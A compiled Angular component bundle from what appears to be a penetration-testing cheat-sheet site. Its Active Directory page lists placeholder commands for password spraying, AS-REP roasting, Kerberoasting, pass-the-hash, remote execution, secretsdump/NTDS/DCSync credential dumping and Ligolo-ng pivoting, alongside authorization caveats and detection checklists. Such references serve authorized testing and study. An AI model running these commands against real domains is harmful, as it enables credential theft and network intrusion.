# Create a DirectoryEntry with lab credentials supplied
# through a secure input mechanism.
# Do not hardcode passwords in scripts or website examples.
`;attackPasswordSpray=`
# Password spraying tests one approved candidate password
# against a controlled set of test accounts.
#
# Before testing:
# 1. Obtain explicit authorization.
# 2. Review lockout policy and approved attempt limits.
# 3. Use designated lab accounts.
# 4. Monitor authentication logs.
#
# Do not run a spray against an unspecified or production domain.
`;attackSmbValidation=`
# Validate a known lab credential against an authorized SMB host
# with NetExec (success does not necessarily mean admin access).

nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>'

# Enumerate shares when authorized
nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares

# Review authentication status, privileges and share permissions.
`;attackKerbrute=`
# Kerbrute password spraying syntax for a controlled lab
# Confirm lockout policy and test scope first.

kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt '<lab-password>'

# Stop if authentication errors or lockout indicators appear.
# Prefer dedicated test accounts and an agreed attempt limit.
`;attackDcsyncRequirements=`
# DCSync abuses directory replication permissions.
# It does not require an interactive login to the DC, but
# the account must have the relevant replication rights.

# Review effective permissions for:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (where relevant)

# Investigate unexpected principals with replication privileges.
`;attackDcsyncDetection=`
# Detection and validation checklist

# - Review directory replication events and domain-controller logs.
# - Investigate replication requests from unusual hosts/accounts.
# - Audit privileged group membership and delegated ACLs.
# - Remove unnecessary replication rights.
# - Rotate exposed credentials and assess krbtgt remediation
#   with the domain administrator.
#
# Event availability depends on audit policy and Windows version.
`;attackPostCompromise=`
# Post-assessment checklist

1. Record the account and credential type discovered.
2. Identify the exact privileges and affected systems.
3. Avoid using recovered credentials beyond the approved scope.
4. Protect evidence and redact secrets in reports.
5. Notify the system owner of critical credential exposure.
6. Recommend credential rotation and least-privilege remediation.
7. Remove temporary files and tools according to the engagement plan.
`;flowScan=`
# Full TCP port scan
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN openPorts

# Review discovered ports
cat openPorts
`;flowServices=`
# Enumerate discovered services and default scripts
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN services

# Common Active Directory ports
# 53    DNS
# 88    Kerberos
# 135   MSRPC
# 139   NetBIOS
# 389   LDAP
# 445   SMB
# 464   Kerberos password change
# 636   LDAPS
# 3268  Global Catalog
# 3389  RDP
# 5985  WinRM
# 1433  MSSQL
`;flowWinRM=`
# Connect to an authorized lab host using valid credentials
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
`;flowHostEnumeration=`
# Identify the current user and security context
whoami
whoami /all
whoami /priv
whoami /groups

# Identify the host
hostname
systeminfo

# Review network configuration
ipconfig /all
route print

# Review local users and groups
net user
net localgroup
net localgroup Administrators
`;flowPrivEscChecks=`
# Check current security privileges
whoami /priv
whoami /groups

# Review operating system details
systeminfo

# Inspect services
Get-Service

# Review scheduled tasks
schtasks /query /fo LIST /v
`;flowPrivEscReview=`
# Privilege escalation review checklist
# 1. Identify enabled token privileges.
# 2. Review service permissions and service paths.
# 3. Inspect scheduled tasks and their permissions.
# 4. Check writable directories and executable paths.
# 5. Review installed software and applicable patches.
# 6. Search for exposed configuration files and credentials.
# 7. Validate each finding only in the authorized lab.
# 8. Record evidence and the resulting security context.
`;flowPostCompromise=`
# Confirm the current identity and privilege level
whoami
whoami /all

# Review local administrators
net localgroup Administrators

# Review domain groups
net group /domain

# Review domain users
net user /domain

# Review current logon sessions
query user
qwinsta

# Inspect locally available Kerberos tickets
klist
`;flowCredentialAudit=`
# Credential exposure assessment
# Review the following sources within the authorized scope:
#
# - Application configuration files
# - Scripts containing embedded credentials
# - PowerShell history
# - Windows services and scheduled task configurations
# - Unattended installation files
# - Accessible shares and backup files
#
# Treat passwords, hashes, tickets and secret material as sensitive.
# Do not export or retain credentials outside the approved lab scope.
`;flowKerberosAudit=`
# Enumerate SPNs registered to a domain user
setspn -L USER

# Find domain users with registered SPNs using PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Review the current Kerberos ticket cache
klist

# Review delegation and privileged-account exposure.
# Use approved directory auditing tools to inspect:
# - Unconstrained delegation
# - Constrained delegation
# - Resource-based constrained delegation
# - Privileged group membership
# - Replication-related directory permissions
`;flowMssqlAudit=`
# MSSQL security assessment checklist
#
# 1. Identify reachable SQL Server instances.
# 2. Verify which account is used for authentication.
# 3. Review server roles and database permissions.
# 4. Check whether the account has excessive privileges.
# 5. Review linked servers and delegation configuration.
# 6. Check whether dangerous features are enabled unnecessarily.
# 7. Document evidence and recommended remediation.
#
# Perform testing only against explicitly authorized instances.
`;flowPivotEnumeration=`
# On the Windows pivot host
ipconfig /all
route print

# Identify the network interfaces and reachable subnets.
# Record the pivot host IP and the target subnet before
# configuring the tunnel.
`;flowLigolo=`
# Start the Ligolo-ng proxy on the authorized testing machine
sudo ./proxy -selfcert

# Start the Ligolo-ng agent on the authorized pivot host
# Use the proxy address and port configured for your lab.
# Example agent invocation:
./agent -connect PROXY_IP:11601 -ignore-cert

# After the agent connects:
# 1. Select the correct session in the proxy.
# 2. Start the tunnel.
# 3. Configure the route to the lab subnet.
# 4. Verify reachability before scanning.
#
# Consult the Ligolo-ng documentation for your platform
# and the exact route configuration required by your lab.
`;flowPostPivot=`
# Scan a newly reachable lab host
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN pivotPorts

# Enumerate discovered services
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices

# Reassess each host
# - Identify the operating system and exposed services.
# - Enumerate domain membership and available shares.
# - Validate access using approved lab credentials.
# - Review SQL Server and other application services.
# - Update the network map and document findings.
#
# Do not assume that credentials valid on one host
# should be reused on another without authorization.
`;linuxAdInitialScan=String.raw`# Full TCP port scan
nmap -p- --min-rate 5000 -T4 <IP>

# Service and version detection
nmap -sCV -p <ports> <IP>

# Parse openPorts and scan discovered services
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) <IP> -oN services

# Important AD ports
# 88   Kerberos
# 389  LDAP
# 445  SMB
# 5985 WinRM
# 3268 Global Catalog`;linuxAdNoCredentials=String.raw`# RPC enumeration
rpcclient -U "" -N <IP>
# Inside rpcclient:
enumdomusers
querydispinfo

# SMB anonymous enumeration
smbclient -L //<IP> -N
smbclient //<IP>/<Share> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
enum4linux -a <IP>
enum4linux -u 'domain.com\\guest' -a <IP>
smbmap -u anonymous -H <IP>

# LDAP anonymous: discover Base DN
ldapsearch -x -H ldap://<IP> -s base

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com"

# Extract domain usernames
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" -s sub "(&(objectClass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Search user descriptions and other attributes for exposed credentials
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" "(objectClass=user)" description

# Authenticated LDAP query
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com"

# Enumerate computer objects and check readable LAPS attributes
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName ms-Mcs-AdmPwd

# Kerberos username enumeration
kerbrute userenum -d corp.com users.txt --dc <IP>

# AS-REP roasting
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt rockyou.txt

# DNS zone transfer
dig axfr corp.com @<IP>`;linuxAdWithCredentials=String.raw`# Validate credentials
crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com

# Password policy
crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol

# Check accounts that require a password change
nxc smb <IP> -u users.txt -p '' --continue-on-success

# Change an expired or must-change password when authorized
impacket-changepasswd domain/user@<DC_IP> -newpass '<NEW_PASSWORD>'

# Enumerate SMB shares
crackmapexec smb <IP> -u user -p '<PASSWORD>' --shares

# Enumerate domain SIDs and users
impacket-lookupsid domain/user:'<PASSWORD>'@<IP>
impacket-lookupsid domain.local/ -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
impacket-lookupsid anonymous@<IP>

# Access SYSVOL
smbclient //dc1/SYSVOL -U 'domain.htb/user%<PASSWORD>'
smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"

# Access shares
smbclient //<IP>/<Share> -U 'user%<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>' -r <Share>

# Enumerate domain users
impacket-GetADUsers corp.com/user:'<PASSWORD>' -dc-ip <IP>

# Enumerate computer objects
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Kerberoasting
impacket-GetUserSPNs corp.com/user:'<PASSWORD>' -dc-ip <IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound collection
bloodhound-python -u user -p '<PASSWORD>' -d corp.com -dc dc1.corp.com -c all

# Check local administrator access across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com --local-auth

# Enumerate active SMB sessions
crackmapexec smb <IP> -u user -p '<PASSWORD>' --sessions`;linuxAdLateralMovement=String.raw`# WinRM - password
evil-winrm -i <IP> -u user -p '<PASSWORD>'

# WinRM - domain formats
evil-winrm -i <IP> -u 'corp\\user' -p '<PASSWORD>'
evil-winrm -i <IP> -u user@corp.com -p '<PASSWORD>'

# WinRM - Pass the Hash
evil-winrm -i <IP> -u user -H <NTLM_HASH>

# WMI execution
impacket-wmiexec corp.com/user:'<PASSWORD>'@<IP>
impacket-wmiexec user:'<PASSWORD>'@<IP>

# PsExec - requires administrative access
impacket-psexec corp.com/user:'<PASSWORD>'@<IP>
impacket-psexec user:'<PASSWORD>'@<IP>

# Pass the Hash with WMI
impacket-wmiexec -hashes :<NTLM_HASH> user@<IP>

# Pass the Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>

# Validate an NTLM hash
crackmapexec smb <IP> -u user -H <NTLM_HASH>

# Validate credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com

# Decision guide
# 5985/5986 open + authorized user -> WinRM
# SMB + local admin privileges -> PsExec
# WinRM unavailable, SMB available -> consider WMI
# NTLM hash available -> test authorized Pass-the-Hash options`;linuxAdCredentialDumping=String.raw`# Remote credential dumping - requires sufficient privileges
impacket-secretsdump corp.com/user:'<PASSWORD>'@<IP>

# Extract local SAM hashes from collected hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract NTDS hashes from collected files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Extract LSA secrets from collected hives
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

# NetExec: SAM
nxc smb <IP> -u user -p '<PASSWORD>' --sam

# NetExec: LSA secrets
nxc smb <IP> -u user -p '<PASSWORD>' --lsa

# NetExec: LSASS
nxc smb <IP> -u user -p '<PASSWORD>' -M lsassy

# NetExec: NTDS - requires replication privileges
nxc smb <DC_IP> -u user -p '<PASSWORD>' --ntds

# NetExec: LAPS - requires permission to read the relevant attributes
nxc smb <IP> -u user -p '<PASSWORD>' -M laps

# NetExec: gMSA - requires appropriate directory permissions
nxc ldap <DC_IP> -u user -p '<PASSWORD>' --gmsa

# NetExec: enumerate sessions and logged-on users
nxc smb <IP> -u user -p '<PASSWORD>' --sessions
nxc smb <IP> -u user -p '<PASSWORD>' --loggedon-users

# Search accessible shares for interesting files
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus

# Download files discovered by spider_plus
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# Crack cached domain credentials where applicable
john --wordlist=rockyou.txt --format=mscash2 hash.txt

# DCSync - requires domain replication rights
impacket-secretsdump -just-dc-user administrator corp.com/user:'<PASSWORD>'@<DC_IP>
impacket-secretsdump -just-dc corp.com/user:'<PASSWORD>'@<DC_IP>

# Offline analysis of an LSASS dump
pypykatz lsa minidump lsass.dmp

# Search common locations for stored credentials on an authorized Windows host
# PowerShell history:
# %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
#
# Common files:
# *.config, *.xml, *.ini, *.txt, web.config, Unattend.xml, sysprep.xml
#
# Group Policy Preferences:
# Search SYSVOL XML files for the cpassword attribute
#
# Credential Manager:
# cmdkey /list
# vaultcmd /list`;static \u0275fac=function(i){return new(i||s)};static \u0275cmp=y({type:s,selectors:[["app-active-directory"]],decls:12,vars:2,consts:[[1,"common-services-page","active-directory-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[4,"ngIf"],["class","detail",4,"ngIf"],[1,"section-header"],[1,"section-line"],[1,"grid"],[1,"card",3,"click"],[1,"card-icon"],[1,"card-content"],[1,"detail"],[1,"back",3,"click"],[1,"section-description"],[3,"command"],["multi",""]],template:function(i,p){i&1&&(t(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),n(4,"~/get.sh/"),e(),n(5,"active-directory "),e(),t(6,"h1",4),n(7,"Active Directory"),e(),t(8,"p",5),n(9," Domain enumeration, object permissions, sessions and relationship analysis for Active Directory assessments. "),e()(),v(10,M,117,0,"ng-container",6)(11,j,16,13,"div",7),e()),i&2&&(a(10),r("ngIf",!p.selectedService),a(),r("ngIf",p.selectedService))},dependencies:[f,P,E,w,b,_,C,k],styles:[".common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto;box-sizing:border-box}.active-directory-page[_ngcontent-%COMP%]   .page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .page-description[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:14px;line-height:1.6;max-width:760px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{display:flex!important;align-items:center!important;gap:1rem!important;width:100%!important;margin:2.5rem 0 1.5rem!important;box-sizing:border-box!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{display:block!important;flex:0 0 auto!important;margin:0!important;padding:0!important;color:#e2e8f0!important;font-family:inherit!important;font-size:.85rem!important;font-weight:600!important;line-height:1.5!important;letter-spacing:.12em!important;text-transform:uppercase!important;white-space:nowrap!important;background:transparent!important;border:none!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   .section-line[_ngcontent-%COMP%]{display:block!important;flex:1 1 0!important;min-width:0!important;height:1px!important;padding:0!important;background:#1e293b!important;border:none!important;opacity:1!important}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{display:flex;align-items:flex-start;gap:1rem;height:100%;min-height:130px;padding:1.25rem;box-sizing:border-box;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;box-sizing:border-box;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:16px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.active-directory-page[_ngcontent-%COMP%]   .card-content[_ngcontent-%COMP%]{min-width:0}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650;line-height:1.4}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.6}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem;min-width:0}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;line-height:1.3;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px;line-height:1.7;max-width:900px}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]{display:inline-flex;align-items:center;gap:.5rem;width:fit-content;max-width:100%;padding:9px 13px;background:transparent;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:13px;font-family:inherit;cursor:pointer;transition:background .2s ease,border-color .2s ease,color .2s ease}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important;overflow:hidden}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px;padding:0 16px;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-size:14px;font-weight:600;line-height:1.5}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   .mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 16px 16px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{position:relative;max-width:100%;box-sizing:border-box;background:#080d14;color:#38bdf8;padding:16px 18px 16px 24px;border-radius:8px;border:1px solid #1e293b;overflow-x:auto;overflow-y:hidden;margin:1rem 0 0;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;line-height:1.7;tab-size:2;white-space:pre;box-shadow:inset 0 0 20px #00000040}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:inherit;font-size:inherit;line-height:inherit}.active-directory-page[_ngcontent-%COMP%]     .terminal-comment{color:#cbd5e1!important;opacity:1!important;font-style:italic;font-weight:500}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar{height:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-track{background:#0b1220;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb{background:#334155;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb:hover{background:#475569}@media(max-width:768px){.common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:24px}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{min-height:110px;padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{width:42px;height:42px}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 12px 12px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{padding:14px;font-size:12px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{gap:.75rem!important;margin:2rem 0 1.25rem!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:.75rem!important}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:none}}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin-bottom:1.5rem;color:#94a3b8;font-size:.9rem;line-height:1.7}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:.85rem;overflow:hidden;background:#0b1220!important;border:1px solid #1e293b;border-radius:10px!important;box-shadow:none!important}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:56px;padding:0 1.25rem;background:#111827;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#172235!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#7fffd4;font-size:.9rem;font-weight:600;letter-spacing:.01em}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   .mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#67e8f9}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:1rem 1.25rem 1.25rem;background:#0b1220}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]{display:block;min-width:0;margin-top:.75rem}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]:first-child{margin-top:0}@media(max-width:768px){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:52px;padding:0 .9rem}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{font-size:.8rem}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:.85rem}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}}"]})};export{A as ActiveDirectory};
